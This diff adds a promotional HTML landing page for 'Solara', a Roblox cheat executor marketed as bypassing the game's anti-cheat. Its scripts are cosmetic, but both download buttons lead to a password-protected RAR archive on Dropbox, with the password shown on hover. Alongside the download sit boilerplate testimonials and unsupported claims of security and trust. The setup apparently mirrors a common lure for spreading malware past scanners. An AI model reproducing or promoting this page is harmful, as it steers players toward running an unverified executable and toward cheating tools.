@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Solara External - The Best Roblox Executor</title>
+  <!-- Meta Tags for SEO -->
+  <meta name="description" content="Solara is the first and best external executor for Roblox after Byfron. Experience unparalleled scripting performance, security, and reliability. Download now!">
+  <meta name="keywords" content="Solara, Roblox executor, Roblox script executor, external executor, Byfron, Roblox scripting, Roblox hacks, Roblox exploits">
+  <meta name="author" content="Solara Team">
+  <meta name="robots" content="index, follow">
+  <meta property="og:title" content="Solara External - The Best Roblox Executor">
+  <meta property="og:description" content="Solara is the first and best external executor for Roblox after Byfron. Experience unparalleled scripting performance, security, and reliability. Download now!">
+  <meta property="og:image" content="https://i.ibb.co/K3YmF9k/image.jpg">
+  <meta property="og:url" content="https://get-solara.yhub.net">
+  <meta property="og:type" content="website">
+  <!-- Styles and Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="icon" href="https://i.ibb.co/C5SFZzsK/image.jpg" type="image/jpg" sizes="16x16">
+  <style>
+    /* Main styles */
+    body {
+      font-family: 'Poppins', sans-serif;
+      color: white;
+      background: black; /* Black background */
+      margin: 0;
+      height: 100vh;
+      overflow: auto; /* Enable scrolling */
+      position: relative;
+      z-index: 1;
+    }
+
+    /* Blur overlay */
+    .blur-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(10px);
+      z-index: -1;
+    }
+
+    header {
+      text-align: center;
+      padding-top: 5rem;
+      animation: fadeInText 2s ease-in;
+    }
+
+    header h1 {
+      font-size: 3rem;
+      margin-bottom: 1rem;
+    }
+
+    header p {
+      font-size: 1.2rem;
+      color: #e0e0e0;
+    }
+
+    .content {
+      max-width: 800px;
+      margin: 30px auto;
+      text-align: center;
+      animation: fadeSlideIn 2.5s ease-out;
+    }
+
+    .content img {
+      width: 100%;
+      max-width: 300px; /* Уменьшил размер изображения */
+      border-radius: 50%;
+      animation: zoomIn 3s ease;
+      margin: 20px;
+      transition: transform 0.3s ease; /* Анимация увеличения */
+    }
+
+    .content img:hover {
+      transform: scale(1.1); /* Увеличение при наведении */
+    }
+
+    /* Button container */
+    .button-container {
+      position: relative;
+      display: inline-block;
+    }
+
+    .button {
+      background-color: #6b21a8;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      border-radius: 30px;
+      cursor: pointer;
+      font-size: 1rem;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+      transition: all 0.3s ease;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      text-decoration: none;
+      position: relative;
+      z-index: 2;
+    }
+
+    .button:hover {
+      background-color: #8b5cf6;
+      transform: translateY(-5px);
+      box-shadow: 0px 8px 15px rgba(0, 0, 0, 0.4);
+    }
+
+    /* Button click animation */
+    .button.clicked {
+      animation: compress 0.5s ease forwards;
+    }
+
+    @keyframes compress {
+      0% {
+        border-radius: 30px;
+        width: auto;
+      }
+      50% {
+        border-radius: 50%;
+        width: 50px;
+        background-color: #4caf50; /* Green color for success */
+      }
+      100% {
+        border-radius: 50%;
+        width: 50px;
+        background-color: #4caf50;
+      }
+    }
+
+    /* Password reveal effect */
+    .password-reveal {
+      position: absolute;
+      top: 100%;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(107, 33, 168, 0.9);
+      color: white;
+      padding: 10px 20px;
+      border-radius: 10px;
+      font-size: 0.9rem;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55), transform 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+      z-index: 1;
+      white-space: nowrap;
+    }
+
+    .button-container:hover .password-reveal {
+      opacity: 1;
+      visibility: visible;
+      transform: translate(-50%, 10px);
+    }
+
+    /* Navbar */
+    .navbar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      padding: 20px 0;
+      text-align: center;
+      z-index: 10;
+      transition: top 0.3s;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .navbar img {
+      width: 60px;
+      height: 60px;
+      margin-left: 20px;
+      border-radius: 50%;
+      transition: transform 0.3s ease; /* Анимация увеличения */
+      cursor: pointer; /* Курсор при наведении */
+    }
+
+    .navbar img:hover {
+      transform: scale(1.1); /* Увеличение при наведении */
+    }
+
+    /* Navbar download button container */
+    .navbar .button-container {
+      margin-right: 20px;
+    }
+
+    .navbar .download-button {
+      background-color: #6b21a8;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 30px;
+      cursor: pointer;
+      font-size: 1rem;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+      transition: all 0.3s ease;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      text-decoration: none;
+    }
+
+    .navbar .download-button:hover {
+      background-color: #8b5cf6;
+      transform: translateY(-2px);
+      box-shadow: 0px 6px 12px rgba(0, 0, 0, 0.4);
+    }
+
+    /* Navbar password reveal effect */
+    .navbar .password-reveal {
+      background: rgba(255, 255, 255, 0.1); /* Transparent background */
+      backdrop-filter: blur(10px); /* Blur effect */
+      border: 1px solid rgba(255, 255, 255, 0.2); /* Light border */
+    }
+
+    /* Reviews section */
+    .reviews {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 30px 20px;
+      text-align: center;
+      margin: 20px 0;
+    }
+
+    .reviews h3 {
+      font-size: 1.5rem;
+      margin-bottom: 15px;
+    }
+
+    .reviews p {
+      font-size: 1rem;
+      margin: 10px 0;
+      color: #e0e0e0;
+    }
+
+    /* Features section */
+    .features {
+      max-width: 1200px;
+      margin: 30px auto;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .features h2 {
+      font-size: 2rem;
+      margin-bottom: 20px;
+    }
+
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 20px;
+    }
+
+    .feature-card {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 20px;
+      border-radius: 10px;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .feature-card:hover {
+      transform: translateY(-10px);
+      box-shadow: 0px 10px 20px rgba(0, 0, 0, 0.3);
+    }
+
+    .feature-card h3 {
+      font-size: 1.5rem;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    .feature-card p {
+      font-size: 1rem;
+      color: #e0e0e0;
+      text-align: center;
+    }
+
+    /* Particles effect */
+    .particles {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      pointer-events: none;
+      z-index: -1;
+      overflow: hidden;
+    }
+
+    .particle {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      background-color: rgba(139, 92, 246, 0.4); /* Фиолетовый с прозрачностью 40% */
+      border-radius: 50%;
+      animation: float 5s infinite ease-in-out;
+    }
+
+    @keyframes float {
+      0%, 100% {
+        transform: translate(0, 0);
+      }
+      25% {
+        transform: translate(10px, 10px);
+      }
+      50% {
+        transform: translate(-10px, 10px);
+      }
+      75% {
+        transform: translate(10px, -10px);
+      }
+    }
+
+    /* Mouse trail effect */
+    .mouse-trail {
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      background: rgba(255, 255, 255, 0.5); /* Semi-transparent white */
+      border-radius: 50%;
+      pointer-events: none;
+      transform: translate(-50%, -50%) scale(0);
+      animation: trail 1s ease-out forwards;
+    }
+
+    @keyframes trail {
+      0% {
+        transform: translate(-50%, -50%) scale(0);
+        opacity: 1;
+      }
+      100% {
+        transform: translate(-50%, -50%) scale(2);
+        opacity: 0;
+      }
+    }
+
+    /* Typewriter effect */
+    .typewriter {
+      overflow: hidden;
+      white-space: nowrap;
+      margin: 0 auto;
+      letter-spacing: 0.15em;
+      animation: typing 3.5s steps(40, end);
+    }
+
+    @keyframes typing {
+      from {
+        width: 0;
+      }
+      to {
+        width: 100%;
+      }
+    }
+
+    /* Animations */
+    @keyframes fadeInText {
+      0% {
+        opacity: 0;
+      }
+      100% {
+        opacity: 1;
+      }
+    }
+
+    @keyframes fadeSlideIn {
+      0% {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes zoomIn {
+      0% {
+        transform: scale(0.8);
+      }
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    /* Footer */
+    footer {
+      position: relative;
+      text-align: center;
+      padding: 20px 0;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(10px);
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Blur overlay -->
+  <div class="blur-overlay"></div>
+
+  <!-- Navbar with logo and download button -->
+  <div class="navbar">
+    <img src="https://i.ibb.co/3Y4jqkNR/pawel-czerwinski-hcYzYk9Abo-unsplash-2-1.png" alt="Solara Logo" onclick="window.location.href='https://get-solara.yhub.net';">
+    <div class="button-container">
+      <a href="https://www.dropbox.com/scl/fi/2d9yph6prpnh90irsagew/SolaraInstaller.rar?dl=1&e=1&rlkey=khqw8j04998o1ruqjy5koeq2g&st=n1jvzx2n" class="download-button">Download</a>
+      <div class="password-reveal">Password: <strong>solara</strong></div>
+    </div>
+  </div>
+
+  <header>
+    <h1>The First & Best External Executor After Byfron.</h1>
+    <p class="typewriter">Solara offers unparalleled execution for your scripting needs. Trusted by thousands worldwide.</p>
+  </header>
+
+  <div class="content">
+    <img src="https://i.ibb.co/K3YmF9k/image.jpg" alt="Solara Logo" style="max-width: 300px;">
+    <br><br>
+    <div class="button-container">
+      <a href="#" class="button" id="download-button">Download Now</a>
+      <div class="password-reveal">Password: <strong>solara</strong></div>
+    </div>
+  </div>
+
+  <!-- Features section -->
+  <div class="features">
+    <h2>Why Choose Solara?</h2>
+    <div class="features-grid">
+      <div class="feature-card">
+        <h3>High Performance</h3>
+        <p>Experience lightning-fast execution with Solara’s optimized engine.</p>
+      </div>
+      <div class="feature-card">
+        <h3>Secure & Reliable</h3>
+        <p>Built with top-tier security to ensure your scripts run safely.</p>
+      </div>
+      <div class="feature-card">
+        <h3>User-Friendly</h3>
+        <p>Intuitive interface designed for both beginners and experts.</p>
+      </div>
+      <div class="feature-card">
+        <h3>24/7 Support</h3>
+        <p>Our dedicated support team is always here to help you.</p>
+      </div>
+      <div class="feature-card">
+        <h3>Advanced Scripting</h3>
+        <p>Supports advanced scripting features for complex tasks.</p>
+      </div>
+      <div class="feature-card">
+        <h3>Community Driven</h3>
+        <p>Regular updates driven by community feedback and needs.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Reviews section -->
+  <div class="reviews">
+    <h3>What People Are Saying About Us</h3>
+    <p>"Solara made my scripting experience so much easier. I trust it completely!"</p>
+    <p>"By far the best external executor out there. Reliable and fast!"</p>
+    <p>"Amazing support and great performance. A must-have tool!"</p>
+  </div>
+
+  <!-- Particles effect -->
+  <div class="particles" id="particles"></div>
+
+  <!-- YouTube audio -->
+  <iframe id="youtube-audio" style="display: none;" src="https://www.youtube.com/embed/MvtWljsraTs?autoplay=1&mute=0&loop=1&playlist=MvtWljsraTs&controls=0&showinfo=0&rel=0"></iframe>
+
+  <!-- Scripts -->
+  <script>
+    // Intersection Observer for navbar hiding
+    let lastScrollTop = 0;
+    const navbar = document.querySelector('.navbar');
+
+    window.addEventListener('scroll', function() {
+      let currentScroll = window.pageYOffset || document.documentElement.scrollTop;
+      if (currentScroll > lastScrollTop) {
+        navbar.style.top = "-80px"; // Hide the navbar
+      } else {
+        navbar.style.top = "0"; // Show the navbar
+      }
+      lastScrollTop = currentScroll <= 0 ? 0 : currentScroll;
+    });
+
+    // Create particles
+    const particlesContainer = document.getElementById('particles');
+    const numParticles = 100; // Number of particles
+
+    for (let i = 0; i < numParticles; i++) {
+      const particle = document.createElement('div');
+      particle.classList.add('particle');
+      particle.style.left = `${Math.random() * 100}vw`;
+      particle.style.top = `${Math.random() * 100}vh`;
+      particle.style.animationDuration = `${Math.random() * 5 + 3}s`; // Random duration
+      particlesContainer.appendChild(particle);
+    }
+
+    // Redirect to Dropbox after clicking the button
+    const downloadButton = document.getElementById('download-button');
+    downloadButton.addEventListener('click', (e) => {
+      e.preventDefault();
+      downloadButton.classList.add('clicked'); // Add animation class
+      setTimeout(() => {
+        window.location.href = "https://www.dropbox.com/scl/fi/2d9yph6prpnh90irsagew/SolaraInstaller.rar?dl=1&e=1&rlkey=khqw8j04998o1ruqjy5koeq2g&st=n1jvzx2n";
+      }, 500); // 0.5 seconds delay
+    });
+
+    // Mouse trail effect
+    document.addEventListener('mousemove', (e) => {
+      const trail = document.createElement('div');
+      trail.classList.add('mouse-trail');
+      trail.style.left = `${e.pageX}px`;
+      trail.style.top = `${e.pageY}px`;
+      document.body.appendChild(trail);
+
+      // Remove the trail element after the animation ends
+      setTimeout(() => {
+        trail.remove();
+      }, 1000); // Match the duration of the animation
+    });
+
+    // YouTube audio player
+    const tag = document.createElement('script');
+    tag.src = "https://www.youtube.com/iframe_api";
+    const firstScriptTag = document.getElementsByTagName('script')[0];
+    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+
+    let player;
+    function onYouTubeIframeAPIReady() {
+      player = new YT.Player('youtube-audio', {
+        height: '0',
+        width: '0',
+        videoId: 'MvtWljsraTs', // YouTube video ID
+        events: {
+          'onReady': onPlayerReady,
+          'onStateChange': onPlayerStateChange
+        },
+        playerVars: {
+          autoplay: 1,
+          mute: 0,
+          loop: 1,
+          playlist: 'MvtWljsraTs', // Loop the video
+          controls: 0,
+          showinfo: 0,
+          rel: 0
+        }
+      });
+    }
+
+    function onPlayerReady(event) {
+      event.target.playVideo(); // Start playing the video
+    }
+
+    function onPlayerStateChange(event) {
+      if (event.data === YT.PlayerState.ENDED) {
+        player.playVideo(); // Restart the video when it ends
+      }
+    }
+  </script>
+</body>
+</html>
